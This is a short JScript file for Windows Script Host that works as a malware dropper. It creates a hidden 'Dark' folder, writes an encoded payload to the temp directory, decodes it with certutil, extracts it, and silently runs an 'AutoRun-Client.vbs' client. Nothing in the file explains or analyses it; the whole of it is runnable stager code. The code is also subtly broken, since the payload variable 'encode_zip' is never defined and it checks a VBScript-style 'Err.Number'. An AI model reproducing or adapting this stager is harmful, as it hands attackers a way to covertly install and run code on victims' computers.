var fso = new ActiveXObject("Scripting.FileSystemObject");
var objShell = new ActiveXObject("WScript.Shell");

function CreateHiddenDirectory(folderPath) {
    var folder;

    if (!fso.FolderExists(folderPath)) {
        folder = fso.CreateFolder(folderPath);
        folder.Attributes = folder.Attributes + 2; // 2 represents the hidden attribute
    } else {
        // The folder already exists.
    }
}

function IsFileInUse(filePath) {
    var objFile;

    if (fso.FileExists(filePath)) {
        objFile = fso.OpenTextFile(filePath, 8, false, 0);
        if (Err.Number !== 0) {
            return true;
        } else {
            objFile.Close();
            return false;
        }
    } else {
        return false;
    }
}

function ExtractCab(CabFile, ExtractPath) {
    var command = "expand " + CabFile + " -F:* " + ExtractPath;
    var error_code = objShell.Run(command, 0, true);
}

function DeCodeCertutilData(InFile, OutFile) {
    var command = "certutil -decode " + InFile + " " + OutFile;
    var error_code = objShell.Run(command, 0, true);
}

function WriteToData(Filename, Data) {
    var File = fso.CreateTextFile(Filename, true);
    File.Write(Data);
    File.Close();
}

function StartClient(AutoStartFile) {
    var error_code = objShell.Run(AutoStartFile, 0, true);
}

function Main() {
    var TMPATH = objShell.ExpandEnvironmentStrings("%TEMP%");
    var SystemDrive = objShell.ExpandEnvironmentStrings("%SYSTEMDRIVE%");
    var WorkDir = SystemDrive + "\\Dark\\";
    CreateHiddenDirectory(WorkDir);
    var EncodeFile = TMPATH + "\\Encode.txt";
    var ZipFile = WorkDir + "DarkFile.zip";
    var AutoStartFile = "cscript " + WorkDir + "AutoRun-Client.vbs";
    WriteToData(EncodeFile, encode_zip);
    DeCodeCertutilData(EncodeFile, ZipFile);
    ExtractCab(ZipFile, WorkDir);
    StartClient(AutoStartFile);
}

Main();
